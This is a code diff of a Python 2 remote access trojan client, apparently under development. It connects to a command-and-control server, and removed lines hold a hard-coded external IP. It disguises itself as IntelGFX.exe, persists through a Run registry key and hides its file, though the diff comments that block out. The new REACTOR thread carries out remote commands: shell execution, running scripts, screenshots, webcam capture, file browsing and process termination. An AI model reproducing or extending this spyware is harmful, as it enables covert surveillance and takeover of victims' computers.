@@ -18,8 +18,8 @@ import datetime
 import zlib
 import shutil
 
-HOST = '109.172.189.74'
-#HOST = '127.0.0.1'
+#HOST = '109.172.189.74'
+HOST = '127.0.0.1'
 PORT = 4434
 ACTIVE = False
 
@@ -43,21 +43,21 @@ destination_path = os.path.join(os.path.join(destination_folder, 'IntelGFX.exe')
 file_name = sys.argv[0]
 
 
-if not 'IntelGFX' in sys.argv[0]:
-    if not os.path.exists(destination_path):
-        shutil.copy2(sys.argv[0], destination_path)
-
-    if Shell32.IsUserAnAdmin() == 1:
-        reg_payload = r'REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{0}" /t REG_SZ /F /D "{1}"'.format(
-            'Intel', destination_path)
-    else:
-        reg_payload = r'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{0}" /t REG_SZ /F /D "{1}"'.format(
-            'Intel', destination_path)
-    subprocess.Popen(reg_payload)
-
-    attrib_payload = r'attrib +h +s %s' % destination_path
-    subprocess.Popen(attrib_payload)
-    sys.exit(0)
+# if not 'IntelGFX' in sys.argv[0]:
+#     if not os.path.exists(destination_path):
+#         shutil.copy2(sys.argv[0], destination_path)
+#
+#     if Shell32.IsUserAnAdmin() == 1:
+#         reg_payload = r'REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{0}" /t REG_SZ /F /D "{1}"'.format(
+#             'Intel', destination_path)
+#     else:
+#         reg_payload = r'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "{0}" /t REG_SZ /F /D "{1}"'.format(
+#             'Intel', destination_path)
+#     subprocess.Popen(reg_payload)
+#
+#     attrib_payload = r'attrib +h +s %s' % destination_path
+#     subprocess.Popen(attrib_payload)
+#     sys.exit(0)
 
 while 1:
     try:
@@ -128,6 +128,80 @@ while 1:
             bottom = User32.GetSystemMetrics(79)
             width = right - left
             height = bottom - top
+
+
+            class REACTOR(threading.Thread):
+
+                def __init__(self, data):
+                    super(REACTOR, self).__init__()
+
+                    self.data = data
+
+                def run(self):
+
+                    if self.data['mode'] == 'raiseException':
+                        raise ValueError('Manualy Generated Exception')
+
+                    # Terminate Client
+                    elif self.data['mode'] == 'terminateClient':
+                        os._exit(1)
+
+                    elif self.data['mode'] == 'updateSource':
+                        raise ValueError('Manually Generated Exception')
+
+                    # Explorer Commands
+                    elif self.data['mode'] == 'explorerMode' and self.data['payload'].startswith('cd '):
+                        try:
+                            os.chdir(self.data['payload'][3:])
+                            output = ''
+                        except:
+                            output = 'dirOpenError'
+
+                    elif self.data['mode'] == 'explorerMode' and self.data['payload'] == 'getContent':
+                        output = ls()
+
+                    # Execute Script
+                    elif self.data['mode'] == 'scriptingMode':
+                        output = executeScript(self.data['payload'])
+
+                    # Get Desktop Preview
+                    elif self.data['mode'] == 'getScreen':
+                        print '1'
+                        output = get_screenshot()
+                        print '2'
+
+                    # Get Webcam Preview
+                    elif self.data['mode'] == 'getWebcam':
+                        output = webcam_shot()
+
+                    # Get Processes List
+                    elif self.data['mode'] == 'processesMode':
+                        output = get_processes_list()
+
+                    # Set Log Settings
+                    elif self.data['mode'] == 'setLogSettings':
+                        set_info(self.data['payload'])
+
+                    # Terminate Process
+                    elif self.data['mode'] == 'terminateProcess':
+                        terminateProcess(self.data['payload'])
+
+                    # Shell Mode
+                    elif self.data['mode'] == 'shellMode' and self.data['payload'].startswith('cd '):
+                        try:
+                            os.chdir(self.data['payload'][3:])
+                            output = ''
+                        except:
+                            output = 'dirOpenError'
+
+                    elif self.data['mode'] == 'shellMode':
+                        output = run_shell(self.data['payload'])
+
+                    else:
+                        return
+
+                    data_send(output, self.data['mode'], session_id=self.data['session_id'], module_id=self.data['module_id'])
+                    print 'sent'
 
 
             class BITMAPINFOHEADER(ctypes.Structure):
@@ -543,21 +617,22 @@ while 1:
 
 
             # Send Data Function
-            def data_send(message, mode, session_id='', end='[ENDOFMESSAGE]'):
+            def data_send(msg, mode, session_id='', module_id='', end='[ENDOFMESSAGE]'):
                 global GLOBAL_SOCKET
                 global ACTIVE
                 global ID
                 message = {
-                    'payload': message,
+                    'payload': msg,
                     'mode': mode,
                     'from': 'client',
                     'session_id': session_id,
+                    'module_id': module_id,
                     'key': ID,
                 }
                 try:
                     GLOBAL_SOCKET.sendall(str(message)+end)
                     ACTIVE = True
-                except socket.error:
+                except (socket.error, NameError):
                     return
 
 
@@ -667,93 +742,32 @@ while 1:
 
                 while 1:
 
+                    key = get_key()
+                    if len(key) != 0:
+                        ID = key
+                        data_send(key, 'clientInitializing')
+                    else:
+                        data_send('noKey', 'clientInitializing')
+                        new_key = data_receive()
+                        set_key(new_key['payload'])
+                        ID = new_key['payload']
+
+                    info_sernder_thread = threading.Thread(target=send_info)
+                    info_sernder_thread.start()
+
+                    # After Initialized
                     while ACTIVE:
-
-                        key = get_key()
-                        if len(key) != 0:
-                            ID = key
-                            data_send(key, 'clientInitializing')
+                        commands = {}
+                        id = 0
+                        data = data_receive()
+                        if data:
+                            id += 1
+                            commands[id] = REACTOR(data)
+                            commands[id].start()
                         else:
-                            data_send('noKey', 'clientInitializing')
-                            new_key = data_receive()
-                            set_key(new_key['payload'])
-                            ID = new_key['payload']
+                            continue
 
-                        info_sernder_thread = threading.Thread(target=send_info)
-                        info_sernder_thread.start()
-
-                        # After Initialized
-                        while ACTIVE:
-                            data = data_receive()
-
-                            if len(data['payload']) == 0 and len(data['mode']) == 0:
-                                raise ValueError('No Payload and Mode')
-
-                            # Terminate Client
-                            elif data['mode'] == 'terminateClient':
-                                os._exit(1)
-
-                            elif data['mode'] == 'updateSource':
-                                raise ValueError('Manually Generated Exception')
-
-                            # Explorer Commands
-                            elif data['mode'] == 'explorerMode' and data['payload'].startswith('cd '):
-                                try:
-                                    os.chdir(data['payload'][3:])
-                                    output = ''
-                                except:
-                                    output = 'dirOpenError'
-
-                            elif data['mode'] == 'explorerMode' and data['payload'] == 'getContent':
-                                output = ls()
-
-                            # Execute Script
-                            elif data['mode'] == 'scriptingMode':
-                                output = executeScript(data['payload'])
-
-                            # Get Desktop Preview
-                            elif data['mode'] == 'getScreen':
-                                output = get_screenshot()
-
-                            # Get Webcam Preview
-                            elif data['mode'] == 'getWebcam':
-                                output = webcam_shot()
-
-                            # Get Processes List
-                            elif data['mode'] == 'processesMode':
-                                output = get_processes_list()
-
-                            # Set Log Settings
-                            elif data['mode'] == 'setLogSettings':
-                                set_info(data['payload'])
-                                continue
-
-                            # Terminate Process
-                            elif data['mode'] == 'terminateProcess':
-                                terminateProcess(data['payload'])
-                                continue
-
-                            # Shell Mode
-                            elif data['mode'] == 'shellMode' and data['payload'].startswith('cd '):
-                                try:
-                                    os.chdir(data['payload'][3:])
-                                    output = ''
-                                except:
-                                    output = 'dirOpenError'
-
-                            elif data['mode'] == 'shellMode':
-                                output = run_shell(data['payload'])
-
-                            # Locked Client Functions
-                            # Set Log Settings
-                            elif data['mode'] == 'setLogSettings':
-                                set_info(data['payload'])
-                                continue
-
-                            data_send(output, 'clientMode', session_id=data['session_id'])
-
-
-            if 'IntelGFX' in sys.argv[0]:
+            if not 'IntelGFX' in sys.argv[0]:
                 # Change Home Dir
                 os.chdir(os.path.dirname(sys.argv[0]))
                 # Run Loggers
@@ -777,4 +791,5 @@ while 1:
             del GLOBAL_SOCKET
             time.sleep(6)
     except socket.error as e:
+        print e
         time.sleep(5)
